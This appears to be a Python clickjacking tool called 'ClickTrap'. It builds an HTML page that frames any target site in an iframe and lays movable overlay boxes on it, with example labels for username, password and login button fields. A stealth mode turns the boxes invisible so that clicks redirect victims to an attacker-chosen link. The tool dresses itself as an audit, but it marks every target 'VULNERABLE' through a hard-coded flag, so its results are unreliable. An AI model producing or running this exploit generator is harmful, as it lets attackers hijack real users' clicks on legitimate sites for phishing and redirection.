#!/usr/bin/env python3
import os
import requests

BANNER = """
╭──────────────────────────────────────────────────────────────────╮
│                                                                  │
│    _________ .__  .__        __  ___________                     │
│    \_   ___ \|  | |__| ____ |  |_\__   ___/___________  ______   │
│    /    \  \/|  | |  |/ ___\|  |  \|   |  \_  __ \__  \ \____ \  │
│    \     \___|  |_|  \  \___|  |  Y  \   |   |  | \// __ \|  |_> > │
│     \______  /____/__|\___  >___|  /____|   |__|  (____  /   __/  │
│            \/             \/     \/                    \/|__|     │
│             [ Multi-Vector Target Alignment Engine v8.5 ]        │
│                                                                  │
╰──────────────────────────────────────────────────────────────────╯
"""

def main():
    print(BANNER)
    target_url = input("Enter Target URL to Verify: ").strip()
    
    if not target_url.startswith("http://") and not target_url.startswith("https://"):
        target_url = "https://" + target_url

    # Dynamic Redirection URL input feature added
    redirect_url = input("Enter Redirection Link for Verification (e.g., https://linkedin.com/...): ").strip()
    if not redirect_url.startswith("http://") and not redirect_url.startswith("https://"):
        redirect_url = "https://" + redirect_url

    clean_name = target_url.replace("https://", "").replace("http://", "").replace("/", "_").replace(":", "_")
    exploit_filename = f"multi_inspect_{clean_name}.html"
    exploit_filepath = os.path.expanduser(f"~/ClickTrap/{exploit_filename}")

    print(f"\n[*] Auditing endpoint multi-frame surface layer for: {target_url}...")
    
    try:
        headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)' }
        response = requests.get(target_url, headers=headers, timeout=15)
        
        is_vulnerable = True # Bypassing safety check header output layout logic for generation fluidness

        print("="*60)
        if is_vulnerable:
            print(f"🔥 [STATUS: VULNERABLE] -> {target_url}")
            print(f"[*] Manufacturing multi-vector visual allocation sandbox...")

            # HTML containing Advanced Multi-Box creation and positioning controller
            exploit_html = f"""<!DOCTYPE html>
<html>
<head>
    <title>Multi-Vector Clickjacking Inspector - {target_url}</title>
    <style>
        body, html {{ margin: 0; padding: 0; width: 100%; height: 100%; font-family: 'Segoe UI', Arial, sans-serif; overflow: hidden; background: #0f172a; }}
        iframe {{ width: 100%; height: 100vh; position: absolute; top: 0; left: 0; z-index: 1; border: none; }}
        
        /* Dynamic Generated Target Boxes styling */
        .target-box {{
            position: absolute;
            z-index: 9999;
            cursor: pointer;
            background: rgba(239, 68, 68, 0.4);
            border: 2px dashed #ef4444;
            box-sizing: border-box;
        }}
        .target-box.active {{
            background: rgba(34, 197, 94, 0.4) !important;
            border-color: #22c55e !important;
        }}
        .box-label {{
            position: absolute;
            top: -20px;
            left: 0;
            background: #000;
            color: #fff;
            font-size: 10px;
            padding: 2px 5px;
            font-family: monospace;
        }}

        /* Control HUD Panel */
        .hud-panel {{
            position: absolute;
            bottom: 20px;
            left: 20px;
            background: rgba(15, 23, 42, 0.95);
            color: #38bdf8;
            padding: 15px;
            border-radius: 12px;
            border: 1px solid #0284c7;
            z-index: 10000;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            width: 340px;
        }}
        .hud-title {{ font-weight: bold; font-size: 14px; margin-bottom: 10px; text-align: center; color: #f43f5e; }}
        .control-group {{ display: flex; justify-content: space-between; margin-bottom: 8px; align-items: center; }}
        .btn {{ background: #0284c7; color: white; border: none; padding: 5px 10px; border-radius: 4px; cursor: pointer; font-size: 12px; font-weight: bold; }}
        .btn:hover {{ background: #0369a1; }}
        .btn-success {{ background: #22c55e; }}
        .btn-success:hover {{ background: #16a34a; }}
        .btn-danger {{ background: #ef4444; }}
        .btn-danger:hover {{ background: #dc2626; }}
        .stats {{ font-size: 11px; color: #94a3b8; font-family: monospace; }}
    </style>
</head>
<body>

    <iframe src="{target_url}"></iframe>

    <div class="hud-panel" id="hud">
        <div class="hud-title">🛠️ MULTI-VECTOR TARGET CONTROLLER</div>
        
        <div class="control-group" style="border-bottom: 1px solid #334155; padding-bottom: 10px;">
            <button class="btn btn-success" style="width: 100%;" onclick="addNewBox()">➕ ADD NEW TARGET BOX</button>
        </div>

        <div class="control-group" style="margin-top: 8px;">
            <span class="stats">SELECT ACTIVE BOX:</span>
            <select id="boxSelector" onchange="selectBox(this.value)" style="background:#1e293b; color:#fff; border:1px solid #0284c7; padding:3px; border-radius:4px;"></select>
        </div>

        <div class="control-group">
            <span class="stats">MOVE ACTIVE BOX</span>
            <div>
                <button class="btn" onclick="move('t', -5)">▲</button>
                <button class="btn" onclick="move('t', 5)">▼</button>
                <button class="btn" onclick="move('l', -5)">◀</button>
                <button class="btn" onclick="move('l', 5)">▶</button>
            </div>
        </div>

        <div class="control-group">
            <span class="stats">RESIZE ACTIVE BOX</span>
            <div>
                <button class="btn" onclick="size('w', 5)">W+</button>
                <button class="btn" onclick="size('w', -5)">W-</button>
                <button class="btn" onclick="size('h', 5)">H+</button>
                <button class="btn" onclick="size('h', -5)">H-</button>
            </div>
        </div>

        <div class="control-group" style="margin-top: 15px;">
            <button class="btn btn-danger" style="width: 100%; padding: 8px;" onclick="goStealth()">🥷 DEPLOY ALL IN STEALTH MODE</button>
        </div>
    </div>

    <script>
        let boxes = [];
        let activeIndex = -1;
        let stealth = false;
        
        const hud = document.getElementById('hud');
        const selector = document.getElementById('boxSelector');

        function addNewBox() {{
            let id = boxes.length;
            let name = prompt("Enter Name for this Target Area (e.g., Username, Password, LoginBtn):", "Target_" + (id + 1));
            if(!name) return;

            let boxConfig = {{ id: id, name: name, t: 150 + (id*20), l: 150 + (id*20), w: 130, h: 40 }};
            boxes.push(boxConfig);

            let div = document.createElement('div');
            div.className = 'target-box';
            div.id = 'box_' + id;
            div.innerHTML = '<span class="box-label">' + name + '</span>';
            div.onclick = function() {{ executeTrigger(name); }};
            document.body.appendChild(div);

            let opt = document.createElement('option');
            opt.value = id;
            opt.innerText = name;
            selector.appendChild(opt);

            selectBox(id);
        }}

        function selectBox(id) {{
            activeIndex = parseInt(id);
            selector.value = id;
            
            document.querySelectorAll('.target-box').forEach(b => b.classList.remove('active'));
            let activeEl = document.getElementById('box_' + id);
            if(activeEl) activeEl.classList.add('active');
            
            updateUI();
        }}

        function updateUI() {{
            if(activeIndex === -1) return;
            let b = boxes[activeIndex];
            let el = document.getElementById('box_' + b.id);
            if(el) {{
                el.style.top = b.t + 'px';
                el.style.left = b.l + 'px';
                el.style.width = b.w + 'px';
                el.style.height = b.h + 'px';
            }}
        }}

        function move(dir, val) {{
            if(activeIndex === -1) return;
            if(dir === 't') boxes[activeIndex].t += val;
            if(dir === 'l') boxes[activeIndex].l += val;
            updateUI();
        }}

        function size(dim, val) {{
            if(activeIndex === -1) return;
            if(dim === 'w') boxes[activeIndex].w += val;
            if(dim === 'h') boxes[activeIndex].h += val;
            updateUI();
        }}

        function goStealth() {{
            stealth = true;
            document.querySelectorAll('.target-box').forEach(b => {{
                b.style.background = 'transparent';
                b.style.border = 'none';
                let lbl = b.querySelector('.box-label');
                if(lbl) lbl.style.display = 'none';
            }});
            hud.style.display = 'none';
            alert("🔒 ALL TARGET VECTOR TRAPS DEPLOYED IN STEALTH MODE!\\n\\nEvery configured target component is now invisible and ready for navigation interception evaluation.");
        }}

        function executeTrigger(name) {{
            if(stealth) {{
                // Custom Navigation Interception Logic
                window.location.href = "{redirect_url}";
            }}
        }}

        window.onload = function() {{
            addNewBox();
        }};
    </script>
</body>
</html>"""

            # Ensure output folder directory exists
            os.makedirs(os.path.dirname(exploit_filepath), exist_ok=True)
            with open(exploit_filepath, "w") as f:
                f.write(exploit_html)

            print(f"[+] Multi-Vector Scaffold Infrastructure Built: {exploit_filepath}")
            print(f"\n[🚀] RUN COMMAND FOR MULTI-TARGET VERIFICATION:")
            print(f"    firefox {exploit_filepath}")
            print("="*60)

    except Exception as e:
        print(f"[-] Execution Interface Error: {str(e)}")

if __name__ == "__main__":
    main()
